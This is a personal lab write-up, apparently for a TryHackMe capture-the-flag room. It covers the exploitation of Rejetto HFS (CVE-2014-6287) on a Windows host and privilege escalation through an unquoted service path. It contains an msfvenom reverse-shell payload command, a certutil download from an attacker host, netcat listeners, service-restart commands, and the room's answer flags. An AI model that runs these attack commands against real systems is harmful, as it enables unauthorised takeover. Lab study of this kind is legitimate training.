## Target: 10.66.156.246
### Recon
- Nmap: ``nmap -A 10.66.156.246 -p- -oA nmap`` & ``nmap -sS -Pn 10.66.156.246`` (since port 80 was not identified by the first scan - they are blocking ICMP)
### Enumeration
- Open Ports:
	First nmap scan
	- **135**/tcp, **msrpc**, Microsoft Windows RPC
	- **139**/tcp, **netbios-ssn**, Microsoft Windows netbios-ssn
	- **445**/tcp, **microsoft-ds**, Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
	- **5985**/tcp, **http**, Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	- **47001**/tcp, **http**, Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	- **49152-6**/tcp, **msrpc**, Microsoft Windows RPC
	- **49190-1**/tcp, **msrpc**, Microsoft Windows RPC
	Second nmap scan
	- **80**/tcp, http
	- **8080**/tcp, http-proxy
#### Question 1: Who is employee of the month?
A: Bill Harper
_We can find this either by inspecting the source code or by attempting to save the image._
#### Question 2: Take a look at the other web server. What file server is running?
A: Rejetto HTTP File Server
_A google search related to HTTPFileServer 2.3_
#### Question 3: What is the CVE number to exploit this file server?
A: 2014-6287
_Again, a google search_
### Vulnerabilities
- Description: Rejetto HttpFileServer (HFS) is vulnerable to remote command execution attack due to a poor regex in the file ParserLib.pas. This module exploits the HFS scripting commands by using '%00' to bypass the filtering. This module has been tested successfully on HFS 2.3b over Windows XP SP3, Windows 7 SP1 and Windows 8.
# Method 1
### Exploitation
- We are instructed to use metasploit to gain an initial shell. We use _exploit/windows/http/rejetto_hfs_exec_.
- Note: we needed to change the _SRVPORT_ in metasploit because it was listening on 8080 and was conflicting with our _RPORT_.
### Post Exploitation
- As instructed, we now are going to use the _Powerup_ script for Windows to look for abnormalities.
	- We upload the file to our victim with ``upload ~/PowerSploit.psd1``
	- To execute: ``load powershell`` && ``powershell_shell``
![[Screenshot 2026-01-03 at 7.05.20 PM.png]]
![[Screenshot 2026-01-03 at 7.09.05 PM.png]]
#### Question 4: Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an _unquoted service path_ vulnerability?
A: AdvancedSystemCareService9
##### From TryHackMe:
The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!
### Privilege Escalation
- We will craft an msfvenom payload to give us a root/admin shell. We will need to upload the binary and replace the legitimate one, and then restart the program.
	- ``msfvenom -p windows/shell_reverse_tcp LHOST=10.66.121.119 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe``
	- This exploits an [[Unquoted Service Paths Vulnerability]]
- We set up a netcat listener on port 4443 to wait for the connection.
- We upload the executable somewhere along the path to our unquoted service.
- Then we stop and start the service to trigger the .exe.
![[Screenshot 2026-01-03 at 7.37.51 PM.png]]
### Flags
- User: _b04763b6fcf51fcd7c13abc7db4fd365_
- Root: _9af5f314f57607c00fd09803a587db80_
# Method 2

### Exploitation
- We need several files on our attacking machine in order to exploit without metasploit
	- nc.exe
	- Our Advanced.exe payload
	- winPEASx64.exe (We are dealing with a 32 bit system) *Note - How would we know that beforehand?*
	- 39161.py from Exploit-DB.com
- We open a python server listening preferably on 80 but can be any port of our choosing.
- We edit the exploit file to point to our IP and a port of our choosing. A netcat listener is opened. *Note - I had to also add the port number (8000) that our python server was running, because the attackbox was using port 80 that the script defaults to.*
- The exploit must run twice, once to upload the files and once to initiate the connection back to our netcat listener. Now we're in.

### Post Exploitation
- Now we use certutil to upload our winPEASx64.exe to the target. ``certutil.exe -urlcache -split -f http://[Attacker_IP]:[Port]/winPEASx64.exe``
- We run winPEAS ``winPEAS.exe`` and note the unquoted service path vulnerability that we exploited for privesc earlier.
- Start a nc listener on the port we specified in our msfvenom payload (4443)
- ``cd`` into C:\Program Files (x86)\IObit and use certutil again to upload our Advanced.exe payload.
- Stop and restart the service to catch a root shell
	- ``sc stop AdvancedSystemCareService9``
	- ``sc start AdvancedSystemCareService9``

ROOOT! 
![[Screenshot 2026-01-05 at 7.17.08 PM.png]]
### Notes
- Do more research on the _Unquoted Service Path_ vulnerabilities.